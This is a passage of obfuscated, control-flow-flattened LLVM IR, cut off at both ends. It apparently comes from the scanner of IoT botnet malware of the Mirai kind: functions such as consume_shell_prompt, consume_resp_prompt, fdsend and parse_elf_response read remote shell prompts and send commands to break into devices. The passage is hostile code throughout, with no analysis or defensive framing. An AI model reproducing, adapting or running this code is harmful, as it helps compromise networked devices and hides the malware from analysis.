    i32 -1794723056, label %120
    i32 -930337941, label %122
    i32 -231950773, label %123
    i32 1147420343, label %124
    i32 -1374505110, label %125
    i32 -364520221, label %135
    i32 -1296972603, label %137
    i32 -890572218, label %138
    i32 -1904957829, label %139
    i32 -901404458, label %143
    i32 1382887080, label %144
    i32 -203726374, label %146
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %6, align 4
  %15 = icmp sgt i32 %14, 0
  %16 = select i1 %15, i32 -696512970, i32 -1831244699
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %19 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i32 0, i32 7
  %20 = load i32, i32* %6, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [8192 x i8], [8192 x i8]* %19, i64 0, i64 %21
  %23 = load i8, i8* %22, align 1
  %24 = sext i8 %23 to i32
  %25 = icmp eq i32 %24, 58
  %26 = select i1 %25, i32 -1548939038, i32 597650566
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %29 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %28, i32 0, i32 7
  %30 = load i32, i32* %6, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds [8192 x i8], [8192 x i8]* %29, i64 0, i64 %31
  %33 = load i8, i8* %32, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %34, 62
  %36 = select i1 %35, i32 -1548939038, i32 1333912999
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %39 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %38, i32 0, i32 7
  %40 = load i32, i32* %6, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [8192 x i8], [8192 x i8]* %39, i64 0, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = icmp eq i32 %44, 36
  %46 = select i1 %45, i32 -1548939038, i32 -1070777904
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %49 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %48, i32 0, i32 7
  %50 = load i32, i32* %6, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [8192 x i8], [8192 x i8]* %49, i64 0, i64 %51
  %53 = load i8, i8* %52, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp eq i32 %54, 35
  %56 = select i1 %55, i32 -1548939038, i32 503769576
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %59 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %58, i32 0, i32 7
  %60 = load i32, i32* %6, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds [8192 x i8], [8192 x i8]* %59, i64 0, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = icmp eq i32 %64, 37
  %66 = select i1 %65, i32 -2068632645, i32 -965462421
  store i32 %66, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %5, align 4
  %69 = icmp eq i32 %68, 1
  %70 = select i1 %69, i32 -1548939038, i32 -965462421
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %6, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %8, align 4
  store i32 -1831244699, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  store i32 10524305, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i32, i32* %6, align 4
  %77 = add nsw i32 %76, -1
  store i32 %77, i32* %6, align 4
  store i32 -2076587211, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i32, i32* %8, align 4
  %80 = icmp eq i32 %79, -1
  %81 = select i1 %80, i32 1796329468, i32 -1904957829
  store i32 %81, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %5, align 4
  %84 = icmp eq i32 %83, 1
  %85 = select i1 %84, i32 -1642499950, i32 -1374505110
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %88 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %87, i32 0, i32 7
  %89 = getelementptr inbounds [8192 x i8], [8192 x i8]* %88, i32 0, i32 0
  %90 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %91 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %90, i32 0, i32 4
  %92 = load i32, i32* %91, align 8
  %93 = call i32 @util_memsearch(i8* %89, i32 %92, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.144, i32 0, i32 0), i32 4)
  store i32 %93, i32* %7, align 4
  %94 = icmp ne i32 %93, -1
  %95 = select i1 %94, i32 -1832260825, i32 -1416889976
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %7, align 4
  store i32 %97, i32* %8, align 4
  store i32 1147420343, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %100 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %99, i32 0, i32 7
  %101 = getelementptr inbounds [8192 x i8], [8192 x i8]* %100, i32 0, i32 0
  %102 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %103 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %102, i32 0, i32 4
  %104 = load i32, i32* %103, align 8
  %105 = call i32 @util_memsearch(i8* %101, i32 %104, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.145, i32 0, i32 0), i32 5)
  store i32 %105, i32* %7, align 4
  %106 = icmp ne i32 %105, -1
  %107 = select i1 %106, i32 -856662206, i32 -2076789876
  store i32 %107, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  %109 = load i32, i32* %7, align 4
  store i32 %109, i32* %8, align 4
  store i32 -231950773, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %112 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %111, i32 0, i32 7
  %113 = getelementptr inbounds [8192 x i8], [8192 x i8]* %112, i32 0, i32 0
  %114 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %115 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %114, i32 0, i32 4
  %116 = load i32, i32* %115, align 8
  %117 = call i32 @util_memsearch(i8* %113, i32 %116, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.146, i32 0, i32 0), i32 3)
  store i32 %117, i32* %7, align 4
  %118 = icmp ne i32 %117, -1
  %119 = select i1 %118, i32 -1794723056, i32 -930337941
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %7, align 4
  store i32 %121, i32* %8, align 4
  store i32 -930337941, i32* %switchVar
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  store i32 -231950773, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  store i32 1147420343, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  store i32 -890572218, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %127 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %126, i32 0, i32 7
  %128 = getelementptr inbounds [8192 x i8], [8192 x i8]* %127, i32 0, i32 0
  %129 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %130 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %129, i32 0, i32 4
  %131 = load i32, i32* %130, align 8
  %132 = call i32 @util_memsearch(i8* %128, i32 %131, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.147, i32 0, i32 0), i32 7)
  store i32 %132, i32* %7, align 4
  %133 = icmp ne i32 %132, -1
  %134 = select i1 %133, i32 -364520221, i32 -1296972603
  store i32 %134, i32* %switchVar
  br label %loopEnd

; <label>:135:                                    ; preds = %loopEntry
  %136 = load i32, i32* %7, align 4
  store i32 %136, i32* %8, align 4
  store i32 -1296972603, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  store i32 -890572218, i32* %switchVar
  br label %loopEnd

; <label>:138:                                    ; preds = %loopEntry
  store i32 -1904957829, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i32, i32* %8, align 4
  %141 = icmp eq i32 %140, -1
  %142 = select i1 %141, i32 -901404458, i32 1382887080
  store i32 %142, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 -203726374, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  %145 = load i32, i32* %8, align 4
  store i32 %145, i32* %3, align 4
  store i32 -203726374, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %147 = load i32, i32* %3, align 4
  ret i32 %147

loopEnd:                                          ; preds = %144, %143, %139, %138, %137, %135, %125, %124, %123, %122, %120, %110, %108, %98, %96, %86, %82, %78, %75, %74, %71, %67, %57, %47, %37, %27, %17, %13, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @fdsend(i32, i8*, ...) #0 {
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i64
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca [5026 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca [1 x %struct.__va_list_tag], align 16
  store i32 %0, i32* %4, align 4
  store i8* %1, i8** %5, align 8
  store i32 0, i32* %7, align 4
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %8, i32 0, i32 0
  %10 = bitcast %struct.__va_list_tag* %9 to i8*
  call void @llvm.va_start(i8* %10)
  %11 = getelementptr inbounds [5026 x i8], [5026 x i8]* %6, i32 0, i32 0
  %12 = load i8*, i8** %5, align 8
  %13 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %8, i32 0, i32 0
  %14 = call i32 @vsprintf(i8* %11, i8* %12, %struct.__va_list_tag* %13) #7
  store i32 %14, i32* %7, align 4
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %8, i32 0, i32 0
  %16 = bitcast %struct.__va_list_tag* %15 to i8*
  call void @llvm.va_end(i8* %16)
  %17 = load i32, i32* %4, align 4
  %18 = getelementptr inbounds [5026 x i8], [5026 x i8]* %6, i32 0, i32 0
  %19 = load i32, i32* %7, align 4
  %20 = sext i32 %19 to i64
  %21 = call i64 @send(i32 %17, i8* %18, i64 %20, i32 16384)
  store i64 %21, i64* %.reg2mem
  %22 = load i32, i32* %7, align 4
  %23 = sext i32 %22 to i64
  store i64 %23, i64* %.reg2mem2
  %switchVar = alloca i32
  store i32 9220188, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 9220188, label %first
    i32 -2044000604, label %26
    i32 -2135238133, label %27
    i32 122121011, label %30
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i64, i64* %.reg2mem
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %24 = icmp ne i64 %.reload, %.reload3
  %25 = select i1 %24, i32 -2044000604, i32 -2135238133
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 122121011, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %4, align 4
  %29 = call i64 @send(i32 %28, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  store i32 1, i32* %3, align 4
  store i32 122121011, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %3, align 4
  ret i32 %31

loopEnd:                                          ; preds = %27, %26, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_shell_prompt(%struct.scanner_connection*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %5, align 4
  %6 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %6, i32 0, i32 7
  %8 = getelementptr inbounds [8192 x i8], [8192 x i8]* %7, i32 0, i32 0
  %9 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %10 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %9, i32 0, i32 4
  %11 = load i32, i32* %10, align 8
  %12 = call i32 @util_memsearch(i8* %8, i32 %11, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.139, i32 0, i32 0), i32 8)
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -671458936, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -671458936, label %first
    i32 1337038990, label %15
    i32 -1521465723, label %16
    i32 -2050622460, label %26
    i32 -1672313548, label %27
    i32 -968395485, label %37
    i32 1936681161, label %38
    i32 829874564, label %48
    i32 -1009188120, label %49
    i32 -1897324190, label %59
    i32 -186399238, label %60
    i32 -1389489341, label %61
    i32 147571489, label %62
    i32 1380681806, label %63
    i32 2089323346, label %64
    i32 -1674600949, label %69
    i32 1266415930, label %73
    i32 202199405, label %83
    i32 1427135913, label %93
    i32 2029429050, label %103
    i32 -1915539501, label %113
    i32 1357842753, label %123
    i32 1393963130, label %133
    i32 -1298114711, label %143
    i32 66558244, label %146
    i32 927740972, label %147
    i32 1556873746, label %150
    i32 -1359932730, label %154
    i32 1361309208, label %155
    i32 65399150, label %159
    i32 -2009516086, label %160
    i32 39496356, label %162
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %13 = icmp ne i32 %.reload, -1
  %14 = select i1 %13, i32 1337038990, i32 -1521465723
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  store i32 -1, i32* %2, align 4
  store i32 39496356, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %18 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %17, i32 0, i32 7
  %19 = getelementptr inbounds [8192 x i8], [8192 x i8]* %18, i32 0, i32 0
  %20 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %21 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %20, i32 0, i32 4
  %22 = load i32, i32* %21, align 8
  %23 = call i32 @util_memsearch(i8* %19, i32 %22, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.140, i32 0, i32 0), i32 6)
  %24 = icmp ne i32 %23, -1
  %25 = select i1 %24, i32 -2050622460, i32 -1672313548
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  store i32 -1, i32* %2, align 4
  store i32 39496356, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %29 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %28, i32 0, i32 7
  %30 = getelementptr inbounds [8192 x i8], [8192 x i8]* %29, i32 0, i32 0
  %31 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %32 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %31, i32 0, i32 4
  %33 = load i32, i32* %32, align 8
  %34 = call i32 @util_memsearch(i8* %30, i32 %33, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.141, i32 0, i32 0), i32 9)
  %35 = icmp ne i32 %34, -1
  %36 = select i1 %35, i32 -968395485, i32 1936681161
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 -1, i32* %2, align 4
  store i32 39496356, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %40 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %39, i32 0, i32 7
  %41 = getelementptr inbounds [8192 x i8], [8192 x i8]* %40, i32 0, i32 0
  %42 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %43 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %42, i32 0, i32 4
  %44 = load i32, i32* %43, align 8
  %45 = call i32 @util_memsearch(i8* %41, i32 %44, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.142, i32 0, i32 0), i32 14)
  %46 = icmp ne i32 %45, -1
  %47 = select i1 %46, i32 829874564, i32 -1009188120
  store i32 %47, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 -1, i32* %2, align 4
  store i32 39496356, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %51 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %50, i32 0, i32 7
  %52 = getelementptr inbounds [8192 x i8], [8192 x i8]* %51, i32 0, i32 0
  %53 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %54 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @util_memsearch(i8* %52, i32 %55, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.143, i32 0, i32 0), i32 5)
  %57 = icmp ne i32 %56, -1
  %58 = select i1 %57, i32 -1897324190, i32 -186399238
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 -1, i32* %2, align 4
  store i32 39496356, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  store i32 -1389489341, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 147571489, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  store i32 1380681806, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  store i32 2089323346, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %66 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %65, i32 0, i32 4
  %67 = load i32, i32* %66, align 8
  %68 = sub nsw i32 %67, 1
  store i32 %68, i32* %4, align 4
  store i32 -1674600949, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %4, align 4
  %71 = icmp sgt i32 %70, 0
  %72 = select i1 %71, i32 1266415930, i32 1556873746
  store i32 %72, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %75 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %74, i32 0, i32 7
  %76 = load i32, i32* %4, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds [8192 x i8], [8192 x i8]* %75, i64 0, i64 %77
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = icmp eq i32 %80, 58
  %82 = select i1 %81, i32 -1298114711, i32 202199405
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  %84 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %85 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %84, i32 0, i32 7
  %86 = load i32, i32* %4, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds [8192 x i8], [8192 x i8]* %85, i64 0, i64 %87
  %89 = load i8, i8* %88, align 1
  %90 = sext i8 %89 to i32
  %91 = icmp eq i32 %90, 62
  %92 = select i1 %91, i32 -1298114711, i32 1427135913
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %95 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %94, i32 0, i32 7
  %96 = load i32, i32* %4, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds [8192 x i8], [8192 x i8]* %95, i64 0, i64 %97
  %99 = load i8, i8* %98, align 1
  %100 = sext i8 %99 to i32
  %101 = icmp eq i32 %100, 36
  %102 = select i1 %101, i32 -1298114711, i32 2029429050
  store i32 %102, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %105 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %104, i32 0, i32 7
  %106 = load i32, i32* %4, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds [8192 x i8], [8192 x i8]* %105, i64 0, i64 %107
  %109 = load i8, i8* %108, align 1
  %110 = sext i8 %109 to i32
  %111 = icmp eq i32 %110, 35
  %112 = select i1 %111, i32 -1298114711, i32 -1915539501
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %115 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %114, i32 0, i32 7
  %116 = load i32, i32* %4, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds [8192 x i8], [8192 x i8]* %115, i64 0, i64 %117
  %119 = load i8, i8* %118, align 1
  %120 = sext i8 %119 to i32
  %121 = icmp eq i32 %120, 37
  %122 = select i1 %121, i32 -1298114711, i32 1357842753
  store i32 %122, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  %124 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %125 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %124, i32 0, i32 7
  %126 = load i32, i32* %4, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds [8192 x i8], [8192 x i8]* %125, i64 0, i64 %127
  %129 = load i8, i8* %128, align 1
  %130 = sext i8 %129 to i32
  %131 = icmp eq i32 %130, 93
  %132 = select i1 %131, i32 -1298114711, i32 1393963130
  store i32 %132, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %135 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %134, i32 0, i32 7
  %136 = load i32, i32* %4, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds [8192 x i8], [8192 x i8]* %135, i64 0, i64 %137
  %139 = load i8, i8* %138, align 1
  %140 = sext i8 %139 to i32
  %141 = icmp eq i32 %140, 126
  %142 = select i1 %141, i32 -1298114711, i32 66558244
  store i32 %142, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  %144 = load i32, i32* %4, align 4
  %145 = add nsw i32 %144, 1
  store i32 %145, i32* %5, align 4
  store i32 1556873746, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  store i32 927740972, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  %148 = load i32, i32* %4, align 4
  %149 = add nsw i32 %148, -1
  store i32 %149, i32* %4, align 4
  store i32 -1674600949, i32* %switchVar
  br label %loopEnd

; <label>:150:                                    ; preds = %loopEntry
  %151 = load i32, i32* %5, align 4
  %152 = icmp eq i32 %151, 0
  %153 = select i1 %152, i32 -1359932730, i32 1361309208
  store i32 %153, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  store i32 1, i32* %5, align 4
  store i32 1361309208, i32* %switchVar
  br label %loopEnd

; <label>:155:                                    ; preds = %loopEntry
  %156 = load i32, i32* %5, align 4
  %157 = icmp eq i32 %156, -1
  %158 = select i1 %157, i32 65399150, i32 -2009516086
  store i32 %158, i32* %switchVar
  br label %loopEnd

; <label>:159:                                    ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 39496356, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = load i32, i32* %5, align 4
  store i32 %161, i32* %2, align 4
  store i32 39496356, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = load i32, i32* %2, align 4
  ret i32 %163

loopEnd:                                          ; preds = %160, %159, %155, %154, %150, %147, %146, %143, %133, %123, %113, %103, %93, %83, %73, %69, %64, %63, %62, %61, %60, %59, %49, %48, %38, %37, %27, %26, %16, %15, %first, %switchDefault
  br label %loopEntry
}

declare void @table_unlock_val(i8 zeroext) #2

declare i8* @table_retrieve_val(i32, i32*) #2

declare void @table_lock_val(i8 zeroext) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_resp_prompt(%struct.scanner_connection*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  call void @table_unlock_val(i8 zeroext 12)
  %7 = call i8* @table_retrieve_val(i32 12, i32* %6)
  store i8* %7, i8** %4, align 8
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 4
  %13 = load i32, i32* %12, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = load i32, i32* %6, align 4
  %16 = sub nsw i32 %15, 1
  %17 = call i32 @util_memsearch(i8* %10, i32 %13, i8* %14, i32 %16)
  store i32 %17, i32* %5, align 4
  %18 = load i32, i32* %5, align 4
  store i32 %18, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1429198512, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1429198512, label %first
    i32 -1603086663, label %21
    i32 -1213889215, label %22
    i32 -2090686416, label %24
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %19 = icmp eq i32 %.reload, -1
  %20 = select i1 %19, i32 -1603086663, i32 -1213889215
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  call void @table_lock_val(i8 zeroext 12)
  store i32 0, i32* %2, align 4
  store i32 -2090686416, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  call void @table_lock_val(i8 zeroext 12)
  %23 = load i32, i32* %5, align 4
  store i32 %23, i32* %2, align 4
  store i32 -2090686416, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %2, align 4
  ret i32 %25

loopEnd:                                          ; preds = %22, %21, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #6

; Function Attrs: noinline nounwind uwtable
define internal i32 @parse_elf_response(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 0, i32* %5, align 4
